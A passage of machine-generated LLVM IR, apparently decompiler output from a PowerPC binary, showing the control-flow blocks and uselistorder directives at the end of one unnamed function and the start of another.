dec_label_pc_1000b14c:                            ; preds = %dec_label_pc_1000b0f8, %dec_label_pc_1000b0f0
  %v0_1000b14c = call i32 @function_10009ac4()
  br label %dec_label_pc_1000b180

dec_label_pc_1000b158:                            ; preds = %dec_label_pc_1000b0e4
  br i1 %v3_1000b158, label %dec_label_pc_1000b160, label %dec_label_pc_1000b348

dec_label_pc_1000b160:                            ; preds = %dec_label_pc_1000b158
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000b178, label %dec_label_pc_1000b16c

dec_label_pc_1000b16c:                            ; preds = %dec_label_pc_1000b160
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000b19810 = load i32, i32* @r30, align 4
  store i32 %v0_1000b19810, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b188

dec_label_pc_1000b178:                            ; preds = %dec_label_pc_1000b160
  %v0_1000b178 = call i32 @function_10009ac4()
  br label %dec_label_pc_1000b180

dec_label_pc_1000b180:                            ; preds = %dec_label_pc_1000b14c, %dec_label_pc_1000b178
  %storemerge3 = phi i32 [ %v0_1000b178, %dec_label_pc_1000b178 ], [ %v0_1000b14c, %dec_label_pc_1000b14c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000b178 ], [ 1, %dec_label_pc_1000b14c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000b180 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000b180, align 4
  br label %dec_label_pc_1000b3e4

dec_label_pc_1000b188:                            ; preds = %dec_label_pc_1000b16c, %dec_label_pc_1000b188
  %v0_1000b19814 = phi i32 [ %v0_1000b19810, %dec_label_pc_1000b16c ], [ %v0_1000b198, %dec_label_pc_1000b188 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000b16c ], [ %v2_1000b18c, %dec_label_pc_1000b188 ]
  store i32 268480908, i32* @lr, align 4
  %v2_1000b188 = call i32 @function_1000ca40(i32 %v0_1000b19814, i32 %storemerge213)
  %v0_1000b18c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b18c = add i32 %v0_1000b18c, %v2_1000b188
  %v0_1000b19c.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000b18c, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b18c, i32* @r4, align 4
  %v0_1000b198 = load i32, i32* @r30, align 4
  store i32 %v0_1000b198, i32* @r3, align 4
  %v2_1000b19c = icmp slt i32 %v0_1000b19c.pr, 1
  %v1_1000b1a0 = add i32 %v0_1000b19c.pr, 1
  store i32 %v1_1000b1a0, i32* %r29.global-to-local, align 4
  br i1 %v2_1000b19c, label %dec_label_pc_1000b188, label %dec_label_pc_1000b1a8

dec_label_pc_1000b1a8:                            ; preds = %dec_label_pc_1000b188
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000b164, label %dec_label_pc_1000b2f4, label %dec_label_pc_1000b2fc

dec_label_pc_1000b1b8:                            ; preds = %dec_label_pc_1000b2f4
  store i32 %v2_1000b1b8, i32* %r29.global-to-local, align 4
  %v0_1000b1bc = load i32, i32* @r30, align 4
  store i32 268480976, i32* @lr, align 4
  %v5_1000b1cc = call i32 @function_1000ca6c(i32 %v0_1000b1bc, i32 %v0_1000b1c0, i32 %v1_1000b2f4, i32* nonnull %stack_var_-184)
  store i32 %v5_1000b1cc, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000b1cc, -1
  br i1 %tmp64, label %dec_label_pc_1000b1f0, label %dec_label_pc_1000b1d8

dec_label_pc_1000b1d8:                            ; preds = %dec_label_pc_1000b1b8
  %v0_1000b1d8 = load i32, i32* @r24, align 4
  %v3_1000b1d8 = icmp eq i32 %v0_1000b1d8, 0
  br i1 %v3_1000b1d8, label %dec_label_pc_1000b348, label %dec_label_pc_1000b1e0

dec_label_pc_1000b1e0:                            ; preds = %dec_label_pc_1000b1d8
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b1e4, label %dec_label_pc_1000b348, label %dec_label_pc_1000b2fc

dec_label_pc_1000b1f0:                            ; preds = %dec_label_pc_1000b1b8
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000b1f4 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000b1f4, label %dec_label_pc_1000b298, label %dec_label_pc_1000b1fc

dec_label_pc_1000b1fc:                            ; preds = %dec_label_pc_1000b1f0
  %v0_1000b1fc = load i32, i32* @r31, align 4
  store i32 %v2_1000b1b8, i32* @r4, align 4
  %v1_1000b204 = add i32 %v0_1000b1fc, 28
  %v2_1000b204 = inttoptr i32 %v1_1000b204 to i32*
  %v3_1000b204 = load i32, i32* %v2_1000b204, align 4
  store i32 %v3_1000b204, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b1fc, i32* @r3, align 4
  %v1_1000b20c = add i32 %v0_1000b1fc, 36
  %v2_1000b20c = inttoptr i32 %v1_1000b20c to i32*
  %v3_1000b20c = load i32, i32* %v2_1000b20c, align 4
  store i32 %v3_1000b20c, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268481060, i32* @lr, align 4
  %v0_1000b220 = call i32 @function_10007108()
  %v0_1000b224 = load i32, i32* @r31, align 4
  %v1_1000b224 = add i32 %v0_1000b224, 4
  %v2_1000b224 = inttoptr i32 %v1_1000b224 to i32*
  %v3_1000b224 = load i32, i32* %v2_1000b224, align 4
  %v3_1000b228 = icmp eq i32 %v3_1000b224, 24
  br i1 %v3_1000b228, label %dec_label_pc_1000b1fc.dec_label_pc_1000b24c_crit_edge, label %dec_label_pc_1000b230

dec_label_pc_1000b1fc.dec_label_pc_1000b24c_crit_edge: ; preds = %dec_label_pc_1000b1fc
  %v1_1000b24c.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000b24c

dec_label_pc_1000b230:                            ; preds = %dec_label_pc_1000b1fc
  %v1_1000b230 = add i32 %v0_1000b224, 28
  %v2_1000b230 = inttoptr i32 %v1_1000b230 to i32*
  %v3_1000b230 = load i32, i32* %v2_1000b230, align 4
  store i32 %v3_1000b230, i32* %r0.global-to-local, align 4
  %v3_1000b234 = icmp eq i32 %v3_1000b230, 0
  br i1 %v3_1000b234, label %dec_label_pc_1000b2fc, label %dec_label_pc_1000b23c

dec_label_pc_1000b23c:                            ; preds = %dec_label_pc_1000b230
  %v0_1000b23c = load i32, i32* %r16.global-to-local, align 4
  %v3_1000b23c = icmp eq i32 %v0_1000b23c, 1
  br i1 %v3_1000b23c, label %dec_label_pc_1000b24c, label %dec_label_pc_1000b244

dec_label_pc_1000b244:                            ; preds = %dec_label_pc_1000b23c
  %v3_1000b244 = icmp eq i32 %v0_1000b23c, 28
  br i1 %v3_1000b244, label %dec_label_pc_1000b24c, label %dec_label_pc_1000b2fc

dec_label_pc_1000b24c:                            ; preds = %dec_label_pc_1000b1fc.dec_label_pc_1000b24c_crit_edge, %dec_label_pc_1000b244, %dec_label_pc_1000b23c
  %v1_1000b24c = phi i32 [ %v1_1000b24c.pre, %dec_label_pc_1000b1fc.dec_label_pc_1000b24c_crit_edge ], [ 28, %dec_label_pc_1000b244 ], [ 1, %dec_label_pc_1000b23c ]
  %v4_1000b24c = icmp eq i32 %v3_1000b224, %v1_1000b24c
  br i1 %v4_1000b24c, label %dec_label_pc_1000b260, label %dec_label_pc_1000b254

dec_label_pc_1000b254:                            ; preds = %dec_label_pc_1000b24c
  %v1_1000b254 = inttoptr i32 %v0_1000b224 to i32*
  %v2_1000b254 = load i32, i32* %v1_1000b254, align 4
  store i32 %v2_1000b254, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b25c.318 to i32), i32* @lr, align 4
  %v0_1000b258 = call i32 @function_100081f8()
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b260:                            ; preds = %dec_label_pc_1000b24c
  %v1_1000b264 = add i32 %v0_1000b224, 16
  %v2_1000b264 = inttoptr i32 %v1_1000b264 to i32*
  %v3_1000b264 = load i32, i32* %v2_1000b264, align 4
  store i32 %v3_1000b264, i32* %r11.global-to-local, align 4
  %v0_1000b268 = load i32, i32* @r24, align 4
  %v2_1000b268 = sub i32 %tmp35, %v0_1000b268
  %v1_1000b26c = add i32 %v0_1000b224, 32
  %v2_1000b26c = inttoptr i32 %v1_1000b26c to i32*
  %v3_1000b26c = load i32, i32* %v2_1000b26c, align 4
  store i32 %v3_1000b26c, i32* %r0.global-to-local, align 4
  %v1_1000b270 = add i32 %v2_1000b268, -1
  %v1_1000b274 = add i32 %v3_1000b264, 4
  %v2_1000b278 = mul i32 %v1_1000b270, %v1_1000b274
  store i32 %v2_1000b278, i32* %r11.global-to-local, align 4
  %v2_1000b27c = add i32 %v0_1000b224, 36
  %v3_1000b27c = inttoptr i32 %v2_1000b27c to i32*
  store i32 %v1_1000b270, i32* %v3_1000b27c, align 4
  %v0_1000b280 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b280 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000b280 = icmp ugt i32 %v0_1000b280, %v1_1000b280
  br i1 %v3_1000b280, label %dec_label_pc_1000b2fc, label %dec_label_pc_1000b288

dec_label_pc_1000b288:                            ; preds = %dec_label_pc_1000b260
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000b290 = load i32, i32* @r31, align 4
  %v2_1000b290 = add i32 %v1_1000b290, 36
  %v3_1000b290 = inttoptr i32 %v2_1000b290 to i32*
  store i32 0, i32* %v3_1000b290, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b298:                            ; preds = %dec_label_pc_1000b1f0
  %v3_1000b298 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1000b298, i32* @r3, align 4
  store i32 268481184, i32* @lr, align 4
  %v0_1000b29c = call i32 @function_100081f8()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000b2a4 = load i32, i32* %r16.global-to-local, align 4
  %v4_1000b2a4 = icmp eq i32 %tmp29, %v1_1000b2a4
  br i1 %v4_1000b2a4, label %dec_label_pc_1000b2ac, label %dec_label_pc_1000b2e0

dec_label_pc_1000b2ac:                            ; preds = %dec_label_pc_1000b298
  %v0_1000b2ac = load i32, i32* @r31, align 4
  %v1_1000b2ac = add i32 %v0_1000b2ac, 16
  %v2_1000b2ac = inttoptr i32 %v1_1000b2ac to i32*
  %v3_1000b2ac = load i32, i32* %v2_1000b2ac, align 4
  store i32 %v3_1000b2ac, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000b2b4 = icmp eq i32 %v3_1000b2ac, %tmp28
  br i1 %v4_1000b2b4, label %dec_label_pc_1000b2bc, label %dec_label_pc_1000b340

dec_label_pc_1000b2bc:                            ; preds = %dec_label_pc_1000b2ac
  %v1_1000b2bc = add i32 %v0_1000b2ac, 36
  %v2_1000b2bc = inttoptr i32 %v1_1000b2bc to i32*
  %v3_1000b2bc = load i32, i32* %v2_1000b2bc, align 4
  %v1_1000b2c0 = add i32 %v0_1000b2ac, 28
  %v2_1000b2c0 = inttoptr i32 %v1_1000b2c0 to i32*
  %v3_1000b2c0 = load i32, i32* %v2_1000b2c0, align 4
  store i32 %v3_1000b2c0, i32* %r0.global-to-local, align 4
  %v2_1000b2c4 = mul i32 %v3_1000b2bc, %tmp28
  %v2_1000b2cc = add i32 %v3_1000b2c0, %v2_1000b2c4
  store i32 %v2_1000b2cc, i32* @r3, align 4
  store i32 268481236, i32* @lr, align 4
  %v0_1000b2d0 = call i32 @function_10007108()
  %v0_1000b2d4 = load i32, i32* @r31, align 4
  %v1_1000b2d4 = add i32 %v0_1000b2d4, 36
  %v2_1000b2d4 = inttoptr i32 %v1_1000b2d4 to i32*
  %v3_1000b2d4 = load i32, i32* %v2_1000b2d4, align 4
  %v1_1000b2d8 = add i32 %v3_1000b2d4, 1
  store i32 %v1_1000b2d8, i32* %v2_1000b2d4, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b2e0:                            ; preds = %dec_label_pc_1000b298, %dec_label_pc_1000b288, %dec_label_pc_1000b254, %dec_label_pc_1000b2bc
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000b2bc ], [ 0, %dec_label_pc_1000b298 ], [ 0, %dec_label_pc_1000b288 ], [ %stack_var_-88.118, %dec_label_pc_1000b254 ]
  %v0_1000b2e0 = load i32, i32* @r28, align 4
  %v1_1000b2e0 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000b2e0 = add i32 %v1_1000b2e0, %v0_1000b2e0
  store i32 %v2_1000b2e0, i32* %r28.global-to-local, align 4
  %v0_1000b2e4 = load i32, i32* @r24, align 4
  %v1_1000b2e4 = add i32 %v0_1000b2e4, 1
  store i32 %v1_1000b2e4, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000b2ec = icmp slt i32 %v1_1000b2e4, %tmp35
  br i1 %v2_1000b2ec, label %dec_label_pc_1000b2f4, label %dec_label_pc_1000b2fc

dec_label_pc_1000b2f4:                            ; preds = %dec_label_pc_1000b1a8, %dec_label_pc_1000b2e0
  %v0_1000b1c0 = phi i32 [ %v2_1000b2e0, %dec_label_pc_1000b2e0 ], [ %v2_1000b18c, %dec_label_pc_1000b1a8 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000b2e0 ], [ 1, %dec_label_pc_1000b1a8 ]
  %v1_1000b2f4 = load i32, i32* @r27, align 4
  %v2_1000b2f4 = icmp slt i32 %v0_1000b1c0, %v1_1000b2f4
  br i1 %v2_1000b2f4, label %dec_label_pc_1000b1b8, label %dec_label_pc_1000b2fc

dec_label_pc_1000b2fc:                            ; preds = %dec_label_pc_1000b1e0, %dec_label_pc_1000b1a8, %dec_label_pc_1000b2f4, %dec_label_pc_1000b230, %dec_label_pc_1000b260, %dec_label_pc_1000b2e0, %dec_label_pc_1000b244
  %v0_1000b2fc = load i32, i32* @r19, align 4
  store i32 268481284, i32* @lr, align 4
  %v1_1000b300 = call i32 @function_10004ab4(i32 %v0_1000b2fc)
  %v3_1000b308 = icmp eq i32 %arg5, 0
  %v0_1000b318 = load i32, i32* @r30, align 4
  br i1 %v3_1000b308, label %dec_label_pc_1000b318, label %dec_label_pc_1000b310

dec_label_pc_1000b310:                            ; preds = %dec_label_pc_1000b2fc
  %v2_1000b310 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000b318, i32* %v2_1000b310, align 4
  br label %dec_label_pc_1000b320

dec_label_pc_1000b318:                            ; preds = %dec_label_pc_1000b2fc
  store i32 %v0_1000b318, i32* @r3, align 4
  store i32 268481312, i32* @lr, align 4
  %v0_1000b31c = call i32 @function_100081f8()
  br label %dec_label_pc_1000b320

dec_label_pc_1000b320:                            ; preds = %dec_label_pc_1000b310, %dec_label_pc_1000b318
  %v0_1000b320 = load i32, i32* @r21, align 4
  store i32 %v0_1000b320, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268481324, i32* @lr, align 4
  %v0_1000b328 = call i32 @function_100081f8()
  store i32 ptrtoint (i32* @global_var_10012b0c.306 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b424

dec_label_pc_1000b340:                            ; preds = %dec_label_pc_1000b2ac
  %v1_1000b340 = inttoptr i32 %v0_1000b2ac to i32*
  %v2_1000b340 = load i32, i32* %v1_1000b340, align 4
  store i32 %v2_1000b340, i32* @r3, align 4
  store i32 268481352, i32* @lr, align 4
  %v0_1000b344 = call i32 @function_100081f8()
  br label %dec_label_pc_1000b348

dec_label_pc_1000b348:                            ; preds = %dec_label_pc_1000b158, %dec_label_pc_1000b0c0, %dec_label_pc_1000b1e0, %dec_label_pc_1000b1d8, %dec_label_pc_1000b0d8, %dec_label_pc_1000b0a0, %dec_label_pc_1000b340
  %v0_1000b348 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000b348 = icmp eq i32 %v0_1000b348, 0
  br i1 %v3_1000b348, label %dec_label_pc_1000b350, label %dec_label_pc_1000b3a0

dec_label_pc_1000b350:                            ; preds = %dec_label_pc_1000b348
  store i32 ptrtoint (i32* @global_var_100103e0.261 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae54, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v0_1000b36c = call i32 @function_10009200()
  %v0_1000b374 = call i32 @function_100091f8()
  %v3_1000b37c = load i32, i32* @global_var_100104cc.310, align 4
  store i32 %v2_1000ae54, i32* @r3, align 4
  %v1_1000b388 = add i32 %v3_1000b37c, -1
  store i32 %v1_1000b388, i32* %r29.global-to-local, align 4
  %v0_1000b38c = call i32 @function_10009200()
  %v0_1000b390 = load i32, i32* @r22, align 4
  %v2_1000b390 = icmp slt i32 %v0_1000b390, %v1_1000b388
  br i1 %v2_1000b390, label %dec_label_pc_1000b398, label %dec_label_pc_1000b3a0

dec_label_pc_1000b398:                            ; preds = %dec_label_pc_1000b350
  %v1_1000b398 = add i32 %v0_1000b390, 1
  store i32 %v1_1000b398, i32* @r22, align 4
  br label %dec_label_pc_1000b3bcthread-pre-split.backedge

dec_label_pc_1000b3bcthread-pre-split.backedge:   ; preds = %dec_label_pc_1000b398, %dec_label_pc_1000b140, %dec_label_pc_1000b3b8
  %v0_1000b3bc.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000b3bc.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000aeb0.lr.ph, label %dec_label_pc_1000b3d4

dec_label_pc_1000b3a0:                            ; preds = %dec_label_pc_1000b050, %dec_label_pc_1000b350, %dec_label_pc_1000b348, %dec_label_pc_1000b068
  %v0_1000b3a0 = load i32, i32* @r26, align 4
  %v1_1000b3a0 = add i32 %v0_1000b3a0, 1
  store i32 %v1_1000b3a0, i32* %r0.global-to-local, align 4
  %v1_1000b3a4 = load i32, i32* @r23, align 4
  %v2_1000b3a4 = srem i32 %v1_1000b3a0, %v1_1000b3a4
  store i32 %v2_1000b3a4, i32* @r26, align 4
  %v5_1000b3ac = icmp eq i32 %v2_1000b3a4, 0
  br i1 %v5_1000b3ac, label %dec_label_pc_1000b3b4, label %dec_label_pc_1000b3b8

dec_label_pc_1000b3b4:                            ; preds = %dec_label_pc_1000b3a0
  %v0_1000b3b4 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000b3b4 = add i32 %v0_1000b3b4, 1
  store i32 %v1_1000b3b4, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000b3b8

dec_label_pc_1000b3b8:                            ; preds = %dec_label_pc_1000b3a0, %dec_label_pc_1000b3b4
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000b3bcthread-pre-split.backedge

dec_label_pc_1000aeb0.lr.ph:                      ; preds = %dec_label_pc_1000aeb0.lr.ph.lr.ph, %dec_label_pc_1000b3bcthread-pre-split.backedge
  br label %dec_label_pc_1000aeb0

dec_label_pc_1000b3c8:                            ; preds = %dec_label_pc_1000ae28, %dec_label_pc_1000ae20, %dec_label_pc_1000ae18, %dec_label_pc_1000add0
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000b3d4

dec_label_pc_1000b3d4:                            ; preds = %dec_label_pc_1000b3bcthread-pre-split.backedge, %dec_label_pc_1000aec0, %dec_label_pc_1000af9c, %dec_label_pc_1000b060, %dec_label_pc_1000ae34, %dec_label_pc_1000b3c8
  %v0_1000b3d4 = call i32 @function_10009ac4()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000b3dc = inttoptr i32 %v0_1000b3d4 to i32*
  store i32 -1, i32* %v2_1000b3dc, align 4
  %v0_1000b3e0 = load i32, i32* @r25, align 4
  store i32 %v0_1000b3e0, i32* @r20, align 4
  br label %dec_label_pc_1000b3e4

dec_label_pc_1000b3e4:                            ; preds = %dec_label_pc_1000b180, %dec_label_pc_1000b3d4
  %v0_1000b3e4 = load i32, i32* @r19, align 4
  %v3_1000b3e4 = icmp eq i32 %v0_1000b3e4, -1
  br i1 %v3_1000b3e4, label %dec_label_pc_1000b3f4, label %dec_label_pc_1000b3ec

dec_label_pc_1000b3ec:                            ; preds = %dec_label_pc_1000b3e4
  store i32 268481524, i32* @lr, align 4
  %v1_1000b3f0 = call i32 @function_10004ab4(i32 %v0_1000b3e4)
  br label %dec_label_pc_1000b3f4

dec_label_pc_1000b3f4:                            ; preds = %dec_label_pc_1000b3e4, %dec_label_pc_1000b3ec
  %v0_1000b3f4 = load i32, i32* @r21, align 4
  store i32 %v0_1000b3f4, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268481536, i32* @lr, align 4
  %v0_1000b3fc = call i32 @function_100081f8()
  %v0_1000b400 = load i32, i32* @r30, align 4
  store i32 %v0_1000b400, i32* @r3, align 4
  store i32 268481544, i32* @lr, align 4
  %v0_1000b404 = call i32 @function_100081f8()
  %v0_1000b408 = load i32, i32* @r26, align 4
  %v3_1000b408 = icmp eq i32 %v0_1000b408, -1
  br i1 %v3_1000b408, label %dec_label_pc_1000b454, label %dec_label_pc_1000b410

dec_label_pc_1000b410:                            ; preds = %dec_label_pc_1000b3f4
  store i32 ptrtoint (i32* @global_var_10012b0c.306 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b41c = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000b424

dec_label_pc_1000b424:                            ; preds = %dec_label_pc_1000b320, %dec_label_pc_1000b410
  %storemerge68 = phi i32 [ %v2_1000b41c, %dec_label_pc_1000b410 ], [ %v2_1000ae54, %dec_label_pc_1000b320 ]
  %v1_1000b428.pre-phi = phi i32 [ %v2_1000b41c, %dec_label_pc_1000b410 ], [ %v2_1000ae54, %dec_label_pc_1000b320 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000b428.pre-phi, i32* @r3, align 4
  %v0_1000b42c = call i32 @function_10009200()
  %v0_1000b434 = call i32 @function_100091f8()
  %v0_1000b43c = load i32, i32* @r26, align 4
  store i32 %v0_1000b43c, i32* @global_var_100104c4.307, align 4
  store i32 %v1_1000b428.pre-phi, i32* @r3, align 4
  %v0_1000b44c = load i32, i32* @r20, align 4
  %v1_1000b44c = trunc i32 %v0_1000b44c to i16
  store i16 %v1_1000b44c, i16* @global_var_100103dc.308, align 2
  %v0_1000b450 = call i32 @function_10009200()
  br label %dec_label_pc_1000b454

dec_label_pc_1000b454:                            ; preds = %dec_label_pc_1000b3f4, %dec_label_pc_1000b424
  store i32 %v0_1000add4, i32* %r0.global-to-local, align 4
  %v0_1000b458 = load i32, i32* @r27, align 4
  ret i32 %v0_1000b458

; uselistorder directives
  uselistorder i32 %v1_1000b428.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000b3a4, { 1, 0 }
  uselistorder i32 %v0_1000b318, { 1, 0 }
  uselistorder i32 %v1_1000b2f4, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000b1c0, { 1, 0 }
  uselistorder i32 %v1_1000b2e4, { 1, 0 }
  uselistorder i32 %v0_1000b2ac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000b270, { 1, 0 }
  uselistorder i32 %v0_1000b1fc, { 2, 1, 0 }
  uselistorder i32 %v0_1000b198, { 1, 0 }
  uselistorder i32 %v2_1000b18c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000b0b0, { 1, 0 }
  uselistorder i32 %v1_1000afb0, { 1, 0 }
  uselistorder i32 %v1_1000af84, { 1, 0 }
  uselistorder i32 %v1_1000af50, { 1, 0 }
  uselistorder i32 %v1_1000aee8, { 1, 0 }
  uselistorder i32 %v2_1000ae54, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32 %v0_1000ae08, { 1, 0 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 15, 16, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 5, 1, 4, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 13, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 34, 14, 16, 33, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10007fb8, { 4, 3, 2, 1, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_10007f54, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000806c, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 2, 10, 3, 8, 4, 5, 0, 6, 13, 14, 11, 12, 9, 7 }
  uselistorder i32 (i32)* @function_10007b20, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_10007418, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_10004ab4, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 1, 15, 14, 7, 0, 3, 2 }
  uselistorder i16* @global_var_100103dc.308, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 ()* @function_100080a0, { 9, 8, 7, 6, 10, 3, 2, 11, 5, 4, 1, 0 }
  uselistorder i32 512, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000b454, { 1, 0 }
  uselistorder label %dec_label_pc_1000b424, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3d4, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000aeb0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3a0, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000b3bcthread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b348, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000b320, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2fc, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000b2f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b24c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b188, { 1, 0 }
  uselistorder label %dec_label_pc_1000b180, { 1, 0 }
  uselistorder label %dec_label_pc_1000b024, { 1, 0 }
  uselistorder label %dec_label_pc_1000af9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000aec0, { 1, 0 }
}

define i32 @function_1000b46c() local_unnamed_addr {
dec_label_pc_1000b46c:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000b48c = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000b48c, i32* @r3, align 4
  %v0_1000b494 = call i32 @function_10009200()
  store i32 ptrtoint (i32* @global_var_100103e0.261 to i32), i32* %r3.global-to-local, align 4
  %v0_1000b49c = call i32 @function_100091f8()
  store i32 %v0_1000b49c, i32* %r3.global-to-local, align 4
  %v3_1000b4a4 = load i32, i32* @global_var_100104c8.262, align 4
  %v2_1000b4a8 = icmp sgt i32 %v3_1000b4a4, 0
  br i1 %v2_1000b4a8, label %dec_label_pc_1000b720, label %dec_label_pc_1000b4b0

dec_label_pc_1000b4b0:                            ; preds = %dec_label_pc_1000b46c
  store i32 ptrtoint ([17 x i8]* @global_var_1000f8a0.321 to i32), i32* %r3.global-to-local, align 4
  store i32 268481736, i32* @lr, align 4
  %v3_1000b4c4 = call i32 @function_10004f90(i32 ptrtoint ([17 x i8]* @global_var_1000f8a0.321 to i32), i32 ptrtoint (i32* @global_var_1000f8b4.320 to i32))
  store i32 %v3_1000b4c4, i32* %r3.global-to-local, align 4
  store i32 %v3_1000b4c4, i32* @r26, align 4
  %v3_1000b4c8 = icmp eq i32 %v3_1000b4c4, 0
  br i1 %v3_1000b4c8, label %dec_label_pc_1000b4d0, label %dec_label_pc_1000b6e4.preheader

dec_label_pc_1000b4d0:                            ; preds = %dec_label_pc_1000b4b0
  %v0_1000b4d4 = load i32, i32* @r31, align 4
